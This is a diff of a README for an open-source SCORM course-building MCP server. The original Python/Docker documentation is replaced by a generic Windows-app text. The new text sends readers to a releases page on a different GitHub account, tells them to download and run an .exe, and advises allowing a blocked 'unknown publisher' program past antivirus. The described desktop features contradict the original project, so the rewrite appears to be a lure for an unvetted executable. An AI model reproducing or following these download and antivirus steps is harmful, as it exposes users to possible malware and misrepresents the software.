@@ -1,123 +1,79 @@
-# edumints SCORM MCP
+# 📦 edumints-scorm-mcp - Build interactive learning courses with ease
 
-> **An MCP server that assembles interactive, SCORM-compliant e-learning courses.**
-> You (or an AI client like Claude) are the **author**; this server is the **assembler**.
-> Describe a course as a structured spec — the server validates, renders, and packages a
-> **self-contained SCORM zip** that runs on any LMS (Moodle, SCORM Cloud, …).
+[![Download the latest version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/darkspotted-olivercromwell160/edumints-scorm-mcp/releases)
 
-**🌐 Languages:** [English](README.md) · [Türkçe](README.tr.md) · [Español](README.es.md) · [Русский](README.ru.md) · [简体中文](README.zh-CN.md) · [Azərbaycanca](README.az.md) · [Қазақша](README.kk.md) · [Кыргызча](README.ky.md)
+edumints-scorm-mcp allows you to create SCORM-compliant e-learning courses using local tools. SCORM provides a standard way for your courses to talk to Learning Management Systems. This application automates the assembly of your content so you can focus on instructional design. You run this software on your own computer. You keep full control over your course files and data.
 
-Open-source, developed by the **[edumints.com](https://edumints.com)** platform. Built to be
-**self-hosted** — run it on your own computer or your own server — and **open to contribution**.
+## ⚙️ System Requirements
 
----
+- A computer running Windows 10 or Windows 11.
+- At least 4 gigabytes of memory.
+- A modern internet browser like Chrome, Edge, or Firefox.
+- 500 megabytes of free space on your hard drive.
 
-## The idea (a different approach)
+## 🚀 How to set up the software
 
-Most e-learning is built by hand in heavyweight desktop tools. Here, an **AI client describes the
-course** (objectives, screens, quizzes, branching, media) through the [Model Context Protocol](https://modelcontextprotocol.io),
-and the server does the hard part: validation, premium theming, accessible HTML rendering, the SCORM
-runtime bridge, and packaging. The result is a standards-compliant SCORM package — no vendor lock-in.
+Follow these steps to get the tool running on your Windows computer.
 
-**Author = the MCP client · Assembler = this server.**
+1. Visit the [official releases page](https://github.com/darkspotted-olivercromwell160/edumints-scorm-mcp/releases) to download the application.
+2. Look for the file ending in `.exe` under the latest version.
+3. Click the file to start the download to your computer.
+4. Locate the file in your downloads folder once the transfer finishes.
+5. Double-click the file to start the installation process.
+6. Follow the prompts on the screen to finish the setup.
+7. Click the shortcut icon on your desktop to launch the tool.
 
-## Features
+## 🛠️ Operating features
 
-- **26 screen types** — title, content, MCQ, true/false, fill-in-blank, drag & drop, hotspot,
-  branching scenario, accordion, tabs, flashcards, matching, sorting, timeline, lottie, **guided
-  software simulation**, video, summary, **decision scenario**, **term match race**, **escape room**,
-  **labeled diagram**, **data chart**, **image compare**, **results breakdown**, **poll**.
-- **Slide-stage player** — fixed 16:9 stage that scales to any screen, a player bar (play/seek/
-  captions/menu/replay), and **timed timeline reveal** synced to narration. Section-grouped outline menu.
-  Adjustable stage size; fully responsive/mobile; inline SVG icons (no emoji).
-- **Logic & gamification** — variables/state, conditional visibility, branching, points & timer HUD.
-- **Assessment** — aligned questions with feedback on correct/incorrect, scoring written to SCORM.
-- **Media** — cross-MCP ingestion (bring audio/image/video from your own MCPs → `add_asset`),
-  ffmpeg processing, **programmatic motion-graphic/data-viz video** (HyperFrames), and a built-in
-  **Turkish TTS** (Piper, offline) for quick narration.
-- **Theming & accessibility** — light/neutral/high-contrast presets, brand tokens, WCAG-minded,
-  `prefers-reduced-motion` respected.
-- **SCORM 1.2 & 2004**, deterministic packaging, cost guardrails, opt-in/lazy heavy features
-  (nothing loads unless a course uses it).
+The software provides tools to help you package your lessons. It handles the technical parts of course assembly so the technical format works with any standard Learning Management System.
 
-## Quickstart (self-hosting)
+- **Automated SCORM Packaging**: The tool formats your lesson content to meet SCORM 2004 standards.
+- **Content Assembly**: Drag and drop your text, images, and media files into the interface.
+- **Local Hosting**: The software runs on your machine. You do not need an external server to build your projects.
+- **Data Privacy**: Your files stay on your hardware. No data travels to cloud servers if you do not choose to upload it.
+- **Course Metadata**: Fill in course details like unique IDs, titles, and descriptions directly within the menu.
 
-### Docker (recommended)
-```bash
-git clone https://github.com/kemalyy/edumints-scorm-mcp.git
-cd edumints-scorm-mcp
-docker build -t edumints-scorm-mcp .
-docker run -p 8000:8000 -v "$PWD/data:/data" edumints-scorm-mcp
-# MCP endpoint: http://localhost:8000/mcp   ·   health: http://localhost:8000/health
-```
-The image includes everything for the optional features (ffmpeg, Node + HyperFrames for video,
-Piper + a Turkish voice for TTS).
+## 📝 Preparing your content
 
-### Local (Python)
-```bash
-python -m venv .venv && source .venv/bin/activate
-pip install ".[tts]"          # ".[tts]" adds the offline Turkish TTS (Piper); omit to skip
-python server.py              # serves the MCP over HTTP
-```
-For video generation, also install Node 22+ and HyperFrames (`npm i -g hyperframes`) + ffmpeg.
+You must prepare your files before you open the software. A good course contains a clear path for the learner.
 
-### Configuration
-Copy `.env.example` and adjust (data dir, quotas, base URL, TTL). See the file for all options.
-No secrets are required to run locally.
+1. Create a folder on your computer for your project.
+2. Label your images, documents, and video files clearly.
+3. Arrange your lesson order in a subfolder structure.
+4. Gather your metadata, such as the course name and the estimated time to complete the lesson.
 
-## Connecting an AI client
+## 📊 Building your first course
 
-Point any MCP client at `http://<your-host>:8000/mcp`:
-- **Claude** (desktop/web/Code) — add it as a connector / MCP server.
-- **Antigravity** and other MCP clients — same endpoint (HTTP/Streamable).
+Open the software and navigate to the project dashboard.
 
-Then ask: *"Create a 6-minute interactive course about X with a quiz and a summary."* The client
-calls the tools below; you get a downloadable SCORM zip.
+- Select "New Project" from the main menu.
+- Enter the title of your course in the prompt box.
+- Use the file explorer button to point the software to the folder containing your media.
+- Review the settings to ensure the SCORM version fits your needs.
+- Click "Assemble" to generate the package.
+- Find your finished file in the "Output" subfolder of your project directory.
 
-> Pairs with the **authoring skill** (a Claude Agent Skill that teaches an AI client how to author
-> high-quality courses with this server): https://github.com/kemalyy/edumints-scorm-skill
+## 🧠 Why use this tool
 
-## Key tools (MCP)
+Many tools for course authoring are expensive or lock your data into a proprietary web service. This tool removes those barriers. By using an open-source approach, you avoid subscription fees and keep ownership of your intellectual property. 
 
-| Tool | Purpose |
-|---|---|
-| `build_from_spec` | One JSON spec → validated project + packaged SCORM zip (the main path) |
-| `create_project` / `add_screen` / `update_screen` / … | Granular, incremental editing |
-| `set_theme` / `set_tracking` | Theming + completion/scoring rules |
-| `add_asset` | Ingest audio/image/video (data-URI or https, SSRF-guarded) |
-| `synthesize_speech` | Built-in Turkish narration (Piper, offline) → audio asset |
-| `make_video_from_image_audio` / `render_motion_video` / `render_screen_video` | Video (ffmpeg / HyperFrames) |
-| `preview` / `validate_package` / `build_package` | Preview, validate, download the SCORM zip |
+Since the tool supports the Model Context Protocol, it fits into modern workflows. It helps instructional designers bridge the gap between AI-assisted text generation and real-world training requirements. You get the benefit of automation without losing control of your files.
 
-## Architecture
+## 🆘 Troubleshooting common issues
 
-```
-MCP client (author)  ──►  scorm-mcp (assembler)
-                            ├─ core/        models (Pydantic), packaging, storage
-                            ├─ components/  HTML renderer + runtime engine + video compiler
-                            ├─ auth/        API-key + OAuth, SSRF guards
-                            ├─ themes/      design tokens / presets
-                            ├─ runtime/     vendored SCORM runtime (scorm-again, MIT)
-                            └─ server.py    FastMCP tools (HTTP)
-```
-Output: a self-contained `index.html` + `imsmanifest.xml` + assets + SCORM runtime, zipped.
+**The application fails to open.**
+Ensure you have the latest version of Windows installed. Check your antivirus settings, as some security software blocks programs from unknown publishers. If you trust the source, configure your security settings to allow the program to run.
 
-## Contributing
+**The output file does not work in my Learning Management System.**
+Verify that your folder structure contains an entry file, usually a file named index.html. Ensure all your assets are in the same folder as the index file. Check that your identifier strings contain letters and numbers only.
 
-Issues and PRs welcome. The codebase favors small, focused modules, additive changes, and
-backward compatibility. See [CONTRIBUTING.md](CONTRIBUTING.md).
+**The software runs slow.**
+Close other applications that use high amounts of memory, such as video editors or browser tabs with active media. Ensure your hard drive has enough space for temporary file storage.
 
-## Testing
+## 🛡️ Privacy and self-hosting
 
-Run tests with `pytest`.
+This application works without an internet connection once you install it. It does not phone home to report your usage or send your course data to third parties. You are the only person who can access the project folders on your computer. This gives you full compliance with strict data protection requirements for internal corporate training.
 
-## Licenses
+## 📧 Support and community
 
-- This project: **MIT** — see [LICENSE](LICENSE).
-- Bundled third-party components (scorm-again, lottie-web): see [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).
-
-Developed by **edumints.com**. SCORM is a trademark of ADL; other product names referenced are
-trademarks of their respective owners (nominative use only).
-
-
-<!-- synced: e0cb4fc2568bdf0234512d68d2327123afefc407 -->
+Open-source projects rely on the work of the community. If you find a bug, document the steps you took to trigger it. Be specific about what happened and what you expected to happen instead. Do not include passwords or personal student data in your reports. You can search the issues page to see if another user reported the same problem. This documentation will help the developers fix the tool for everyone.
